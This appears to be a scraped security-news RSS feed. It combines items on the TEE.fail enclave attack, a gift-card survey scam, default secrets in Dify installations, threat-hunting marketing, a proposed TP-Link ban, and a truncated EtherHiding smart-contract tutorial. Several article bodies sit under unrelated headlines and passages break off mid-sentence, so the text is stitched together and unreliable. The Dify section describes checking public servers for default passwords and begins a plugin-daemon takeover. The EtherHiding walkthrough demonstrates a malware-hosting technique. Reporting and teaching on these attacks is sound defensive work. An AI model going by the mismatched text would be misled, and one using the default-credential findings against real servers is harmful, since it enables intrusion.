What we have are secure enclaves. I’ve written about this before:Almost all cloud services have to perform some computation on our data. Even the simplest storage provider has code to copy bytes from an internal storage system and deliver them to the user. End-to-end encryption is sufficient in such a narrow context. But often we want our cloud providers to be able to perform computation on our raw data: search, analysis, AI model training or fine-tuning, and more. Without expensive, esoteric techniques, such as secure multiparty computation protocols or homomorphic encryption techniques that can perform calculations on encrypted data, cloud servers require access to the unencrypted data to do anything useful.Fortunately, the last few years have seen the advent of general-purpose, hardware-enabled secure computation. This is powered by special functionality on processors known as trusted execution environments (TEEs) or secure enclaves. TEEs decouple who runs the chip (a cloud provider, such as Microsoft Azure) from who secures the chip (a processor vendor, such as Intel) and from who controls the data being used in the computation (the customer or user). A TEE can keep the cloud provider from seeing what is being computed. The results of a computation are sent via a secure tunnel out of the enclave or encrypted and stored. A TEE can also generate a signed attestation that it actually ran the code that the customer wanted to run.Secure enclaves are critical in our modern cloud-based computing architectures. And, of course, they have vulnerabilities:The most recent attack, released Tuesday, is known as TEE.fail. It defeats the latest TEE protections from all three chipmakers. The low-cost, low-complexity attack works by placing a small piece of hardware between a single physical memory chip and the motherboard slot it plugs into. It also requires the attacker to compromise the operating system kernel. Once this three-minute attack is completed, Confidential Compute, SEV-SNP, and TDX/SDX can no longer be trusted. Unlike the Battering RAM and Wiretap attacks from last month—which worked only against CPUs using DDR4 memory—TEE.fail works against DDR5, allowing them to work against the latest TEEs.Yes, these attacks require physical access. But that’s exactly the threat model secure enclaves are supposed to secure against.]]></content:encoded></item><item><title>New Browser Security Report Reveals Emerging Threats for Enterprises</title><link>https://thehackernews.com/2025/11/new-browser-security-report-reveals.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXmfzDsP62FvRPwIyRZdDAPcaehng_GAhvSGbVAVkKWjMNyxews4CW0LRurCcsr3Wt2XCRsHWZhnOcHb3RjeKNRjsWLE_QxFNXfxEHm8LQoN5ecufFEZc-ARX6ZEl85Klpq4Z_1CsjybYHBXtUCo2kfydWn9ktUBCrTZrHHpm0aIkMX3fJAdflArlX-84/s1600/browser.jpg" length="" type=""/><pubDate>Mon, 10 Nov 2025 11:58:06 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[According to the new Browser Security Report 2025, security leaders are discovering that most identity, SaaS, and AI-related risks converge in a single place, the user’s browser.

All you have to do is answer a few questions. It looks harmless enough. But once you click, you find yourself in a maze of surveys, redirects, and “partner offers”—without ever actually reaching the end and claiming your prize.This so-called “survey” is part of a lead-generation and affiliate marketing scam, designed not to reward you but to harvest your data and push you through ad funnels that make money for others, at the cost of your privacy. It’s a scam because these pages rarely deliver any real gift card. What they’re after is your personal data.As you move through each step, you’re asked for details like your name, email, phone number, ZIP code and even your home address. In some cases, you’re prompted to share interests such as home repair, debt help, or insurance quotes—each answer helps categorize you for targeted marketing.Even if the page itself doesn’t steal money, that information is still valuable. It can be used to target you with more ads and offers, add you to marketing lists, or personalize follow-up contact. In other words, completing the questionnaire hands over data that can be exploited for profit—even when no gift card ever appears.In some cases, the funnel gets even more specific. For example, if the survey asks you about home projects and you say you’re planning to replace your windows, you might be redirected to what looks like a legitimate home improvement site—often just another form asking for the same details again. The whole thing is designed to keep you filling out more forms, giving up more of your data, to more websites and affiliates.These scams aren’t just annoying time-wasters. They are harvesting your data, eroding your privacy and exposing you to wider risks. Once your details are shared, they can travel far beyond that fake survey.Be resold to advertisers and data brokers, who build detailed profiles about your habits, spending, and location.Lead to a surge of spam calls, texts, and phishing emails tailored to your interests.Feed more convincing scams down the line, since criminals can now personalize their lures using real information about you.End up on unregulated marketing lists that circulate for years, keeping your data in play long after you’ve closed the page.That’s the hidden cost of a “free” gift card: each click fuels a network that profits from your identity, not your participation.Why do people fall for it?The hook is simple—free money and easy participation. But this fake Walmart promotion taps into three powerful psychological triggers:: “You’ve been selected!” sounds personal and special.The promise of low effort: Answering a few questions feels harmless.The illusion of credibility: Walmart’s branding lends legitimacy.These scams spread mainly through advertising and malvertising networks—pop-ups, spam emails, social media ads, or sketchy website banners that imitate real promotions.You might spot them alongside news articles or as “sponsored links” that sound too good to be true. Some appear via push notifications or redirects, whisking you from a real website to a fake reward page in seconds.The designs often use official logos, countdown timers, and congratulatory language to make them look like authentic brand campaigns—tricking people into lowering their guard.It’s an easy mental shortcut: “If this was fake, it wouldn’t look so professional.” That’s what these scammers count on—the appearance of legitimacy mixed with urgency and reward.These gift card offers aren’t just harmless internet fluff—they’re the front door to a sprawling network of data collection and affiliate profiteering. Each click, form, and redirect is designed to extract value from your attention and information, not to reward you.Recognizing these scams early is the best defense. Here’s how to stay safe:Be suspicious of online surveys promising big rewards. Legitimate promotions from major retailers rarely require long questionnaires or partner offers.Never give personal information to unknown pages. If a site asks for your phone number or address for a “free prize,” it’s a red flag.Use browser protection tools. Extensions like Malwarebytes Browser Guard can block known scam domains and malvertising networks before they load. Real Walmart promotions will always come from official domains (like walmart.com or survey.walmart.com), not random URLs with extra words or numbers.Stay alert and skeptical. Online quizzes and reward offers are a favorite bait for scammers. When in doubt – close the tab.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline. If something looks dodgy to you, check if it’s a scam using Malwarebytes Scam Guard, a feature of our mobile protection products.

Default API-Keys and SecretsIn local Dify installations — whether you’re building the product from the source or using the pre-made Docker image, some services are exposed to the public.Building Dify from source requires setting up several services, this is done by launching Docker containers from a docker-compose file called docker-compose.middleware.yaml.Looking at the docker-compose file, you can see that some services are exposed to the host machine (and potentially to the public).Dify, like most products, ships with different API keys and secrets for different services. But there’s a problem: most of these keys and secrets aren’t generated during installation — they’re static and hard-coded — and nothing forces users to change them during setup. This leads to the unfortunate situation where most servers end up keeping the default API keys and secret values, which are publicly known.To verify if this is actually a problem in the real-world, I picked two services and checked their statistics across public servers.Service — Runs  and hosts the database that manages everything Dify needs in order to to run.Dify’s default password for the  user is . I randomly tested 20 servers to see how many kept the default password— turns out 70% of them were still using it. — This service manages the plugins used by Dify (like the GitHub addon and web search tool) and handles communication with LLM models. The next section covers this service in more detail, including how it can be exploited and some statistics.How can attacker abuse this misconfigurations?Each one of the services, if compromised, has the potential to let an attacker compromise the entire Dify instance. The fact that some of these services use default secrets and API keys (which are publicly known) makes them easy targets.While I’m not going to cover every service, I will take a closer look at one in particular: .plugin-deamon service takeoverDify Plugin Daemon is a service that manages the lifecycle of plugins. It’s written mostly in Go and exposes two interfaces:HTTP interface on port  (used by the main Dify API server to install plugins, invoke LLM model queries, and more)TCP interface on port  (for remote plugin installation)While there are also some issues with the TCP interface, we’re going to focus on the HTTP interface running on port 5002.The HTTP interface is defined in the  file. The server starts by defining some base routes (, , ), then adds sub-routes under each one.]]></content:encoded></item><item><title>Large-Scale ClickFix Phishing Attacks Target Hotel Systems with PureRAT Malware</title><link>https://thehackernews.com/2025/11/large-scale-clickfix-phishing-attacks.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiV8goc_pldbDLv5iqvwy1lPOMsFiJpxyBnaT86LqU-Cikl8RRxTJ_85lGPLG5gJvW-2xj77n-slDQ_lzrJ3AviPJUPYT4j_P1X0iQ5UHvohnr_OIVlSubxcbNN09PqQurWuIoLI9SCJ1K1hLnT9PzL5YLJEkPTyeKQYpySzXtTrlITtdSAzvBqAblnS4rX/s1600/hotel-hacks.jpg" length="" type=""/><pubDate>Mon, 10 Nov 2025 09:11:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have called attention to a massive phishing campaign targeting the hospitality industry that lures hotel managers to ClickFix-style pages and harvest their credentials by deploying malware like PureRAT.

Both are essential to a comprehensive cybersecurity strategy.Threat intelligence guides proactive defense, providing context on who might attack, what their motives and attacks are, and which indicators to watch for.Threat hunting finds what defenses miss by continuously investigating systems for anomalies and hidden indicators to catch stealthy attackers that evade automated tools.Recorded Future’s Intelligence Cloud unifies threat intelligence and threat hunting, gathering real-time threat data from across the open web, dark web, and technical sources into a single platform.Clarifying Two Critical Security DisciplinesThreat intelligence and threat hunting are two cornerstone practices in modern cybersecurity, serving different but complementary roles. At the most basic level, threat intelligence is about understanding threats outside the organization, while threat hunting is the active pursuit of threats already within an organization’s network or systems.The two functions work best in tandem, but because they are so closely related, they are often misunderstood or conflated. However, the stakes for getting it right are high—cyber threats are growing more advanced and costly, with the global average cost of a data breach reaching $4.4 million. Organizations that invest in both proactive threat hunting and a well-developed threat intelligence program are better positioned to improve security, decision-making, and incident preparedness. And understanding the distinction between the two helps security leaders leverage the right teams and processes for each.What is Threat Intelligence?Threat intelligence is the practice of gathering and analyzing information about current and emerging threats to help defenders make informed decisions. At its core, threat intelligence is about understanding who is attacking, why they’re doing it, and how they operate.Threat intelligence teams collect data from a wide range of sources and organize it into actionable insights. This process typically involves: Data can come from internal feeds as well as from external sources and research. Threat intelligence teams will pull in indicators of compromise (IOCs), like malicious IPs, domains, malware hashes, phishing emails, and more.Analyzing and contextualizing: Teams will then correlate the data to identify threats and patterns, looking for context to inform who is behind an attack, understand their motivations, and determine the tactics, techniques, and procedures (TTPs) being used.Disseminating intelligence: Threat intelligence is growing in importance across all business functions. Once data has been collected and analyzed, it gets shared with any other teams who might need it, from SOC analysts and incident responders to risk managers and executives. – high-level trends and insights for non-technical audiences (e.g., CISOs, business leaders) that inform policies and long-term strategies – details on specific campaigns, threat actors, or attacks in progress that provide defenders with information like attack timelines or tools used – TTPs and IOCs that inform real-time defense, used directly by SOC teams to tune detection systems – highly technical data usually meant for machine consumption or enrichment of security tools (sometimes overlaps with tactical intelligence but is often more granular and feeds into automation)Ultimately, the purpose of threat intelligence is to enable proactive, evidence-based decision-making in cybersecurity. It reduces uncertainty and helps security teams more effectively allocate resources to mitigate threats before they impact the business. And organizations that prioritize maturing their threat intelligence programs will be better positioned to anticipate emerging threats and shore up defenses before an attack strikes.Threat hunting is a proactive investigative practice in which security analysts actively look for signs of malicious activity or compromise that have evaded traditional security defenses. Threat hunting assumes that attackers may already be lurking in networks and systems undetected and seeks to find them through expert analysis and intuition.Key aspects of threat hunting typically include:Hypothesis-driven investigations: Threat hunters often begin with a hunch or educated guess about a potential threat and then seek evidence to prove or disprove that hypothesis.Behavioral analysis and anomaly detection: Hypothesis-driven investigations often stem from careful behavioral analysis (identifying suspicious patterns in system or user behavior) and anomaly detection (scrutinizing logs and telemetry for anything that doesn’t fit normal patterns).Specific usage of tools and data: Threat hunters leverage common tools (such as SIEM platforms, EDR solutions, and network analysis tools) but use them in a more proactive way. They also use threat intelligence platforms or feeds to enrich what they find and correlate hints across multiple data sources to uncover stealthy threats.Instead of only responding after an incident, threat hunting aims to catch intrusions in their early stages or discover ongoing attacks that haven’t even been noticed yet. Common techniques include:Searching for known IOCs based on threat intelligenceTracking TTPs using frameworks like MITRE ATT&CK and looking for evidence of specific tacticsLeveraging machine learning and advanced analytics to help surface unusual patterns across large data setsEnsuring continuous and iterative hunting, refining hypotheses and adapting quicklyEssentially, threat hunting is a human-driven, proactive hunt for hidden threats. It requires skilled analysts who think like attackers and have the curiosity and patience to dig into data and pursue hidden leads. With a mature threat hunting program, an organization can speed up detection and containment, ultimately leading to less damage from breaches.Threat Intelligence and Threat Hunting: Key DifferencesThreat intelligence and threat hunting are closely related, but it’s important to understand how they differ across several dimensions—such as focus, timing, outputs, and primary users—which in turn helps inform how to best leverage the two practices most effectively.External threat landscape – “what’s currently (or soon might be) out there”“are any of those threats in here right now?”More preparatory – analyzes past attacks and ongoing behaviors to inform future defensesProactive by nature – initiates investigations before a security incident is fully apparentKnowledge – produces insights that guide security strategy (e.g., threat reports, advisories, risk scores)Investigation findings – produces detections within the environment or validates the absence of threatsThreat intelligence analysts or researchers – often will have backgrounds in analysis, malware research, or counterintelligenceSkilled SOC analysts or dedicated threat hunters – typically will have deep knowledge of systems, networks, forensics, and attacker behaviorInformation-centric – heavily analytical, mainly using threat intelligence platforms, databases, OSINT resources, etc.Investigation-centric – heavily operational, mainly using tools like SIEM, EDR, and network monitorsDespite these differences, threat intelligence and threat hunting are both essential for an organization’s cybersecurity strategy. In fact, using one without the other leaves a significant gap—knowing about threats isn’t useful if an organization is not looking for them internally, and hunting blindly without intelligence is inefficient.How Threat Intelligence Powers Threat HuntingThreat intelligence and threat hunting are deeply interconnected strategies that, when executed correctly, can deliver a more thorough security and protection plan for organizations. Threat intelligence in particular often serves as the necessary fuel for successful threat hunting.Guiding hypotheses and focus areas: Threat intelligence provides the starting point for many threat hunts, acting as a roadmap that highlights where threat hunters should look first or what TTPs to look out for.Providing indicators and context: Threat hunters rely on threat intelligence feeds for high-confidence IOCs that they can search for in log data. Threat intelligence also adds helpful context to any suspicious events threat hunters may find, making the search more efficient and effective by enriching data with meaning.Enabling proactive hunting for emerging threats: Intelligence about external vulnerabilities and exploits can prompt internal hunts to ensure that defenses held up or to catch any successful penetration early, before any damage is caused.Improving hunting tools and analytics: Integrating threat intelligence feeds into security monitoring tools (SIEMs, EDRs, etc.) effectively bakes intel into the hunting process, allowing threat hunters to better prioritize their investigations.Overall, threat intelligence and threat hunting operate in a feedback loop: intelligence guides threat hunters on where to look, and whatever they find feeds back into the overall intelligence picture. Each makes the other stronger, and together they enable a much more proactive and informed defense.Benefits of Combining Threat Intelligence and Threat HuntingHow exactly does an organization benefit by integrating their threat intelligence and threat hunting operations? When both practices are used in concert, the results can immeasurably strengthen an organization’s overall security effectiveness.Benefits of integration can include:Faster detection of advanced threats: A combined approach helps identify stealthy attacks sooner than either practice alone. When threat hunters are boosted by threat intelligence, they can zero in on serious threats that automated systems might have missed, reducing dwell time and limiting breach impacts.More effective prioritization of alerts and resources: Integration helps teams differentiate noise from truly critical warnings. Context like risk scores, known malicious indicators, or prevalence of a threat allows threat hunters and SOC analysts focus on what matters most.Stronger overall security posture and resilience: Perhaps the biggest payoff of combining threat intelligence and threat hunting is a more robust and dynamic defense. With the internal vigilance from threat hunting and the external knowledge gained from threat intelligence, the two functions effectively cover both preparation and detection.Adaptive, intelligence-driven defense: The ability to adapt to threats in real-time is a major benefit to a well-integrated security program. Swapping information quickly between threat intelligence and threat hunting makes an organization more responsive and resilient.Threat intelligence and threat hunting can certainly be used independently, and each has the potential to provide useful knowledge to strengthen defenses. But there’s no doubt that an integrated approach transforms an organization’s security strategy from a reactive endeavor to a proactive, intelligence-driven mission.How Recorded Future Utilizes Threat Intelligence and Threat Hunting TogetherThe right tools and platforms play a crucial role in helping organizations bring together threat intelligence and threat hunting in the most seamless, efficient manner. Recorded Future’s Intelligence Cloud is a prime example of a solution designed to unify global threat intelligence with an organization’s security operations, empowering both threat intel analysts and threat hunters on the same platform.Pulling from a breadth of sources (including the open web, dark web, technical feeds, forums, malware repositories, and more), it delivers a holistic view of threats targeting organizations worldwide. All of this intelligence is continuously updated and made available in a searchable, contextualized form.For a threat intelligence analyst, this means instant access to high-quality intel without hours of manual research. For a threat hunter, it means any IOC or clue they come across can be immediately enriched with crucial context, significantly speeding up investigations.One of the biggest strengths a platform like this can have is seamless integration with the tools security teams already use. This means that threat intelligence isn’t locked in a separate silo but instead flows directly into day-to-day security workflows.For example, through Recorded Future’s integrations, analysts can:See risk scores or threat labels next to each log event in a SIEM dashboardEnable automated hunting actions or incident response through SOAR integrationPivot from an indicator they’re investigating to see the wider intelligence context via powerful query capabilities and browser plug-insThese integrations essentially transform threat intelligence and threat hunting into a sum greater than its parts. Practical use cases include:Alert enrichment and triage so threat hunters and incident responders can prioritize and scope appropriatelyThreat hunting “packages” that analysts can search against internallyIntegration with case management so that whether a threat hunter is documenting a new finding or an analyst is writing up an important report, it’s all connectedVulnerability hunting, which helps prioritize which weaknesses to hunt for signs of exploitationPlatforms like Recorded Future’s Intelligence Cloud essentially act as a force multiplier for security teams, combining the scale and speed of machine-driven intelligence with the human-led insight of threat hunting.A Combined Approach for Resilient SecurityThreat intelligence and threat hunting each cover vital ground in an organization’s cybersecurity strategy. Adopting a combined approach means fostering collaboration between intelligence analysts and threat hunters and equipping them with the tools and platforms that bridge their workflows to create that complementary feedback loop.When done correctly, the line between threat intelligence and threat hunting blurs, with threat hunting becoming more intelligence-driven and intelligence becoming more action-oriented.Ready to fortify your security program? Consider how Recorded Future’s Intelligence Cloud can help unite threat intelligence and threat hunting and operationalize that combined approach. Get started here.How do threat hunting and threat intelligence impact an organization’s overall security strategy?Threat intelligence provides context and insight into potential risks, while threat hunting proactively seeks out hidden threats. Both are essential for building a comprehensive, dynamic security posture that improves detection and response.What are the best practices for integrating threat hunting and threat intelligence workflows?Best practices may include establishing clear communication between teams, using threat intelligence to guide hunting hypotheses, and leveraging automated tools to integrate intelligence into hunting operations.How can threat intelligence inform proactive threat hunting tactics?Threat intelligence provides actionable insights like known attacker tactics, techniques, and procedures (TTPs), which can help inform hunting strategies and narrow down specific areas to search for potential threats.What skills and tools are required for effective threat hunting versus utilizing threat intelligence?Threat hunting requires strong analytical skills and expertise in security tools, while threat intelligence relies on data analysis and contextual understanding. Tools like SIEM, threat intelligence platforms, and automated solutions support both functions effectively.]]></content:encoded></item><item><title>Manassas City Public Schools close on Monday due to cyberattack</title><link>https://databreaches.net/2025/11/09/manassas-city-public-schools-close-on-monday-due-to-cyberattack/?pk_campaign=feed&amp;pk_kwd=manassas-city-public-schools-close-on-monday-due-to-cyberattack</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 9 Nov 2025 23:43:41 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Drilling Down on Uncle Sam’s Proposed TP-Link Ban</title><link>https://krebsonsecurity.com/2025/11/drilling-down-on-uncle-sams-proposed-tp-link-ban/</link><author>BrianKrebs</author><category>security</category><pubDate>Sun, 9 Nov 2025 18:14:40 +0000</pubDate><source url="https://krebsonsecurity.com/">Krebs on Security</source><content:encoded><![CDATA[The U.S. government is reportedly preparing to ban the sale of wireless routers and other networking gear from , a tech company that currently enjoys an estimated 50% market share among home users and small businesses. Experts say while the proposed ban may have more to do with TP-Link’s ties to China than any specific technical threats, much of the rest of the industry serving this market also sources hardware from China and ships products that are insecure fresh out of the box.A TP-Link WiFi 6 AX1800 Smart WiFi Router (Archer AX20). recently reported that more than a half-dozen federal departments and agencies were backing a proposed ban on future sales of TP-Link devices in the United States. The story said U.S. Department of Commerce officials concluded TP-Link Systems products pose a risk because the U.S.-based company’s products handle sensitive American data and because the officials believe it remains subject to jurisdiction or influence by the Chinese government.TP-Link Systems denies that, saying that it fully split from the Chinese TP-Link Technologies over the past three years, and that its critics have vastly overstated the company’s market share (TP-Link puts it at around 30 percent). TP-Link says it has headquarters in California, with a branch in Singapore, and that it manufactures in Vietnam. The company says it researches, designs, develops and manufactures everything except its chipsets in-house.TP-Link Systems told The Post it has sole ownership of some engineering, design and manufacturing capabilities in China that were once part of China-based TP-Link Technologies, and that it operates them without Chinese government supervision.“TP-Link vigorously disputes any allegation that its products present national security risks to the United States,” Ricca Silverio, a spokeswoman for TP-Link Systems, said in a statement. “TP-Link is a U.S. company committed to supplying high-quality and secure products to the U.S. market and beyond.”Cost is a big reason TP-Link devices are so prevalent in the consumer and small business market: As this February 2025 story from  observed regarding the proposed ban, TP-Link has long had a reputation for flooding the market with devices that are considerably cheaper than comparable models from other vendors. That price point (and consistently excellent performance ratings) has made TP-Link a favorite among Internet service providers (ISPs) that provide routers to their customers.In August 2024, the chairman and the ranking member of the House Select Committee on the Strategic Competition Between the United States and the Chinese Communist Party called for an investigation into TP-Link devices, which they said were found on U.S. military bases and for sale at exchanges that sell them to members of the military and their families.“TP-Link’s unusual degree of vulnerabilities and required compliance with PRC law are in and of themselves disconcerting,” the House lawmakers warned in a letter (PDF) to the director of the Commerce Department. “When combined with the PRC government’s common use of SOHO [small office/home office] routers like TP-Link to perpetrate extensive cyberattacks in the United States, it becomes significantly alarming.”The letter cited a May 2023 blog post by  about a Chinese state-sponsored hacking group dubbed “” that used a malicious firmware implant for some TP-Link routers to carry out a sequence of targeted cyberattacks against European foreign affairs entities. Check Point said while it only found the malicious firmware on TP-Link devices, “the firmware-agnostic nature of the implanted components indicates that a wide range of devices and vendors may be at risk.”In a report published in October 2024,  said it was tracking a network of compromised TP-Link small office and home office routers that has been abused by multiple distinct Chinese state-sponsored hacking groups since 2021. Microsoft found the hacker groups were leveraging the compromised TP-Link systems to conduct “password spraying” attacks against Microsoft accounts. Password spraying involves rapidly attempting to access a large number of accounts (usernames/email addresses) with a relatively small number of commonly used passwords.TP-Link rightly points out that most of its competitors likewise source components from China. The company also correctly notes that advanced persistent threat (APT) groups from China and other nations have leveraged vulnerabilities in products from their competitors, such as Cisco and Netgear.But that may be cold comfort for TP-Link customers who are now wondering if it’s smart to continue using these products, or whether it makes sense to buy more costly networking gear that might only be marginally less vulnerable to compromise.Almost without exception, the hardware and software that ships with most consumer-grade routers includes a number of default settings that need to be changed before the devices can be safely connected to the Internet. For example, bring a new router online without changing the default username and password and chances are it will only take a few minutes before it is probed and possibly compromised by some type of Internet-of-Things botnet. Also, it is incredibly common for the firmware in a brand new router to be dangerously out of date by the time it is purchased and unboxed.Until quite recently, the idea that router manufacturers should make it easier for their customers to use these products safely was something of an anathema to this industry. Consumers were largely left to figure that out on their own, with predictably disastrous results.But over the past few years, many manufacturers of popular consumer routers have begun forcing users to perform basic hygiene — such as changing the default password and updating the internal firmware — before the devices can be used as a router. For example, most brands of “mesh” wireless routers — like Amazon’s Eero, Netgear’s Orbi series, or Asus’s ZenWifi — require online registration that automates these critical steps going forward (or at least through their stated support lifecycle).For better or worse, less expensive, traditional consumer routers like those from Belkin and Linksys also now automate this setup by heavily steering customers toward installing a mobile app to complete the installation (this often comes as a shock to people more accustomed to manually configuring a router). Still, these products tend to put the onus on users to check for and install available updates periodically. Also, they’re often powered by underwhelming or else bloated firmware, and a dearth of configurable options.Of course, not everyone wants to fiddle with mobile apps or is comfortable with registering their router so that it can be managed or monitored remotely in the cloud. For those hands-on folks — and for power users seeking more advanced router features like VPNs, ad blockers and network monitoring — the best advice is to check if your router’s stock firmware can be replaced with open-source alternatives, such as OpenWrt or DD-WRT.These open-source firmware options are compatible with a wide range of devices, and they generally offer more features and configurability. Open-source firmware can even help extend the life of routers years after the vendor stops supporting the underlying hardware, but it still requires users to manually check for and install any available updates.Happily, TP-Link users spooked by the proposed ban may have an alternative to outright junking these devices, as many TP-Link routers also support open-source firmware options like OpenWRT. While this approach may not eliminate any potential hardware-specific security flaws, it could serve as an effective hedge against more common vendor-specific vulnerabilities, such as undocumented user accounts, hard-coded credentials, and weaknesses that allow attackers to bypass authentication.Regardless of the brand, if your router is more than four or five years old it may be worth upgrading for performance reasons alone — particularly if your home or office is primarily accessing the Internet through WiFi.NB: The Post’s story notes that a substantial portion of TP-Link routers and those of its competitors are purchased or leased through ISPs. In these cases, the devices are typically managed and updated remotely by your ISP, and equipped with custom profiles responsible for authenticating your device to the ISP’s network. If this describes your setup, please do not attempt to modify or replace these devices without first consulting with your Internet provider.]]></content:encoded></item><item><title>San Joaquin County Superior Court concludes sensitive info leaked in data breach</title><link>https://databreaches.net/2025/11/09/san-joaquin-county-superior-court-concludes-sensitive-info-leaked-in-data-breach/?pk_campaign=feed&amp;pk_kwd=san-joaquin-county-superior-court-concludes-sensitive-info-leaked-in-data-breach</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 9 Nov 2025 13:07:20 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Update] VulScan-MCP: Now shows detailed CVE descriptions, severity, and mitigation steps</title><link>https://marketplace.visualstudio.com/items?itemName=abhishekrai43.vulscan-mcp-vscode</link><author>/u/FeelingResolution806</author><category>netsec</category><pubDate>Sun, 9 Nov 2025 05:12:36 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Scan dependencies for CVEs directly in VS Code with GitHub CopilotScans your project dependencies for security vulnerabilities (CVEs) and gives you clear fix instructions.

Any misuse of the information contained here is solely the responsibility of the end user.To demonstrate Etherhiding, we will create a smart contract that returns the string:Onhexgroup: Hi from BlockChainWe will also build a simple HTML page where a user can click a button to fetch that string from the blockchain and display it on the page.To implement this project we will follow several steps:You can download the project’s source code from GitHub, and I’ve also uploaded a YouTube video where you can watch the full implementation process step-by-step.Step 1: Installing the MetaMask ExtensionMetaMask is a cryptocurrency wallet and at the same time, a gateway to the Ethereum blockchain.Simply put, it’s a tool that allows users to interact with decentralized applications (DApps) built on Ethereum and other compatible networks such as BSC (Binance Smart Chain), Polygon, Avalanche, and more.To deploy our smart contract on a blockchain, we first need to have MetaMask installed.For this tutorial, we’ll use the browser extension version of MetaMask.Since I’m using Firefox, I’ll install the MetaMask extension on my Firefox browser.After installation, you’ll need to create a new account in MetaMask.If you already have an existing wallet, you can simply use that instead.Step 2: Adding the Sepolia Test Network to MetaMaskIn blockchains like Ethereum, every transaction on the main network (Mainnet) requires a fee, because users must pay gas fees using real cryptocurrency (such as ETH).However, developers usually don’t want to spend real money while testing or developing decentralized applications (DApps).That’s why test networks (Testnets) exist — they provide environments similar to the mainnet, but without real currency.Sepolia is one of Ethereum’s official test networks that we can use for development and testing purposes.To add the Sepolia test network in MetaMask:Click on the menu icon (three lines) at the top of MetaMask.Enable the option “Show test networks.”Once that’s done, MetaMask will be able to interact with the Sepolia test network, allowing you to deploy and test smart contracts safely.Step 3: Adding Some Free ETH to MetaMaskAs mentioned above, the whole point of using the Sepolia testnet is to avoid real cost — i.e., we still consume “ETH” for gas, but not real money from our pocket.In blockchain terminology, a faucet is a service that dispenses small amounts of cryptocurrency (usually on testnets) to users so they can test transactions or smart contracts without paying with real funds. Faucets are primarily meant for education, testing and development. To avoid abuse, most faucets only release a small amount of tokens at fixed intervals (for example, once every 24 hours).Ethereum Sepolia faucets are services that give you a small amount of test ETH on the Sepolia network. With that test ETH you can: deploy a smart contract to the testnet, send transactions, experiment with gas costs, and generally simulate network behavior without real expense.There are several providers and methods to obtain Sepolia test ETH — for example QuickNode and Alchemy provide faucet-like flows — but some of these services impose limits or requirements (for instance: needing a minimal balance in your account previously, or requiring you to have used the wallet before). These restrictions are there to reduce bot abuse.In my own search I found a service that easily transferred 0.05 Sepolia ETH to my MetaMask wallet. To use such a service, select Ethereum Sepolia as the network and paste your MetaMask wallet address into the faucet’s address field.To view the received amount, go to the Activity section and switch the network from Ethereum Mainnet to Sepolia.To do this, click on Ethereum Mainnet, select Custom, and then enable Sepolia.Alright — now we have enough test ETH to cover the deployment gas for our smart contract.Step 4: Developing the Smart ContractA smart contract is a program that runs on a blockchain and automatically enforces the rules and conditions of an agreement — without the need for intermediaries like banks or lawyers.Simply put, a smart contract is like an automated robot on the blockchain: once certain predefined conditions are met, it executes the specified actions on its own.In our case, we want to create a smart contract that, when called, returns the string: “onhexgroup: Hi from BlockChain”Since a smart contract is essentially a program, we need both a programming language and a development environment.We’ll use Solidity as the programming language and Remix IDE as our development environment.Remix provides a web-based environment similar to VS Code, making it simple and convenient to write, compile, and deploy smart contracts directly from the browser.Open the contracts folder in Remix.Delete all existing files inside that folder.Create a new file named ethhidedemo.sol.Inside that file, paste the following Solidity code:We define a string variable named message that stores the text “Onhexgroup: Hi from BlockChain”.We then define a public function getMessaage() that simply returns the value of message.Step 5: Compiling the Smart Contract CodeJust like in traditional programming languages such as C, a smart contract must be compiled before it can be executed.To compile our smart contract, go to the fourth option in the left sidebar menu of Remix (number 1 in the image).Once inside the Compile section , use the dropdown (number 2) to select the compiler version — we’ll keep the default version.Finally, click on “Compile ethhidedemo.sol” (number 3 in the image) to compile the code and generate the bytecode.If you see a green check mark, it means the compilation was successful.Step 6: Copying the Smart Contract ABIWhen a smart contract is written in a language like Solidity and deployed to the blockchain, its code is converted into bytecode — which is not human-readable.To be able to interact with that contract later (for example, using web3.js, ethers.js, or MetaMask), we need to know:What inputs and outputs they expect, andWhat data types are used.All this information is stored in a structure called the ABI (Application Binary Interface).To obtain the ABI of our contract:Scroll down to the bottom of the Compile section in Remix.There, you’ll find a block of code in JSON format — this is your contract’s ABI.Copy that JSON code and save it somewhere, as we’ll need it later to connect our web application to the contract.Step 7: Deploying the Smart ContractAfter developing and compiling our smart contract, the next step is to deploy it on a blockchain network.As mentioned earlier, we’ll use the Sepolia Test Network for this purpose.To deploy the contract, open the “Deploy & Run Transactions” tab — which is the fifth option in the Remix sidebar.Description of the interface (based on the image):Opens the Deploy & Run Transactions panel.Specifies the deployment and testing environment.Displays your Wallet account.Shows the smart contract you want to deploy.The Deploy button — used to deploy the smart contract.Displays the address of the deployed contract.Since we want to deploy the contract to the Sepolia test network and pay the deployment gas fee using MetaMask, go to the Environment dropdown and select:Browser extension → Injected Provider — MetaMaskAfter selecting this option and connecting MetaMask to Remix, your MetaMask wallet address will appear in the Account field.Next, under Contract, choose the smart contract you created earlier,and finally click on Deploy to deploy it to the Sepolia network — the transaction fee will be automatically deducted from your test ETH.If everything goes well, you’ll see the deployed contract address appear under the Deployed Contracts section.So far, we have developed and deployed our smart contract on the blockchain. To interact with this smart contract, we need an interface. In practice, this interface:Receives requests from our website or application,Forwards the requests to the blockchain,Collects the response, andSends the result back to the website.For this purpose, we will use the Infura RPC service.RPC (Remote Procedure Call) is a method used in blockchain to allow applications (like Remix or MetaMask) to communicate remotely with a node on the blockchain network.Simply put, RPC is a remote request to execute a command on the blockchain. For example, when we click Deploy in Remix, we are actually sending a request via RPC to deploy the contract on the blockchain.We will use INFURA as our RPC provider. To do this:Sign up on the Infura website and select the Free plan.The Free plan will generate an API Key for you.Click on the API Key and go to Active Endpoints to view your available RPC URLs.You will see 